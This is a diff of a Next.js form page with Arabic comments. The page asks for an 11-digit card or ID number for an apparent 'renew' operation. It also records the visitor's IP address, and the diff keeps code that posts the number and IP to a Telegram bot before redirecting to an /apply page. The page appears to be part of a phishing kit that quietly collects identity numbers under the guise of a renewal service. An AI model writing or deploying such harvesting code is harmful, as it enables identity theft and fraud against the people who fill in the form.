@@ -10,75 +10,33 @@ export default function FormPage() {
   const [ipAddress, setIpAddress] = useState(""); // لتخزين عنوان IP
   const router = useRouter();
 
-  // دالة الحصول على عنوان الـ IP
-  const fetchIp = async () => {
-    try {
-      console.log("جاري جلب عنوان IP...");
-      const response = await fetch("https://api.ipify.org?format=json");
-      const data = await response.json();
-      console.log("تم الحصول على عنوان IP بنجاح:", data.ip);
-      setIpAddress(data.ip);
-    } catch (error) {
-      console.error("Error fetching IP address:", error);
-      alert("حدث خطأ أثناء الحصول على عنوان IP");
-    }
-  };
-
-  // جلب الـ IP عند تحميل الصفحة
   useEffect(() => {
+    // الحصول على عنوان IP
+    const fetchIp = async () => {
+      try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        setIpAddress(data.ip);
+      } catch (error) {
+        console.error("Error fetching IP address:", error);
+      }
+    };
+
     fetchIp();
   }, []);
 
-  // دالة معالجة إدخال رقم البطاقة
-  const handleInputChange = (e) => {
-    const value = e.target.value;
-    if (/^\d*$/.test(value) && value.length <= 11) {
-      setIdNumber(value);
-      setError(false);
-    }
+  const handleClear = () => {
+    setIdNumber("");
+    setOperationType("renew");
+    setError(false);
   };
 
-  // دالة إرسال البيانات إلى Telegram
-  const sendToTelegram = async (message) => {
-    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
-    const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
-
-    console.log("التحقق من المتغيرات:");
-    console.log("chatId:", chatId);
-    console.log("botToken:", botToken);
-
-    // التحقق من وجود المتغيرات
-    if (!chatId || !botToken) {
-      console.error("المتغيرات غير موجودة! تأكد من ضبط القيم في البيئة.");
-      alert("المتغيرات غير موجودة في البيئة. تأكد من إعدادها.");
-      return;
-    }
-
-    try {
-      console.log("جاري إرسال الرسالة إلى Telegram...");
-      const response = await fetch(
-        `https://api.telegram.org/bot${botToken}/sendMessage`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-          }),
-        }
-      );
-
-      console.log("تم إرسال الرسالة إلى Telegram. حالة الاستجابة:", response.status);
-      if (!response.ok) {
-        const errorText = await response.text();
-        console.error("خطأ في إرسال الرسالة:", errorText);
-        alert(`خطأ في إرسال الرسالة: ${errorText}`);
-      } else {
-        console.log("الرسالة تم إرسالها بنجاح!");
-      }
-    } catch (error) {
-      console.error("حدث خطأ أثناء إرسال الرسالة إلى Telegram:", error);
-      alert("حدث خطأ أثناء إرسال الرسالة إلى Telegram");
+  const handleInputChange = (e) => {
+    const value = e.target.value;
+    // السماح بإدخال الأرقام فقط والتأكد من عدم تجاوز 11 رقمًا
+    if (/^\d*$/.test(value) && value.length <= 11) {
+      setIdNumber(value);
+      setError(false); // إزالة الخطأ عند إدخال قيمة صحيحة
     }
   };
 
@@ -88,23 +46,34 @@ export default function FormPage() {
     if (idNumber.length === 11) {
       setError(false);
 
+      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
+      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
       const message = `رقم البطاقة: ${idNumber}\nعنوان IP: ${ipAddress}`;
-      console.log("الرسالة المراد إرسالها إلى Telegram:", message);
-      await sendToTelegram(message); // إرسال الرسالة إلى Telegram
 
-      // إذا تم إرسال الرسالة بنجاح
-      router.push(`/apply?idNumber=${idNumber}`);
+      try {
+        const response = await fetch(
+          `https://api.telegram.org/bot${botToken}/sendMessage`,
+          {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+          }
+        );
+
+        if (response.ok) {
+          router.push(`/apply?idNumber=${idNumber}`);
+        } else {
+          alert("أعد المحاولة حدث خطأ ما");
+        }
+      } catch (error) {
+        alert("أعد المحاولة حدث خطأ ما");
+      }
     } else {
       setError(true);
-      console.error("رقم البطاقة غير صحيح. يجب أن يتكون من 11 رقمًا.");
-      alert("رقم البطاقة غير صحيح. يجب أن يتكون من 11 رقمًا.");
     }
-  };
-
-  const handleClear = () => {
-    setIdNumber("");
-    setOperationType("renew");
-    setError(false);
   };
 
   return (
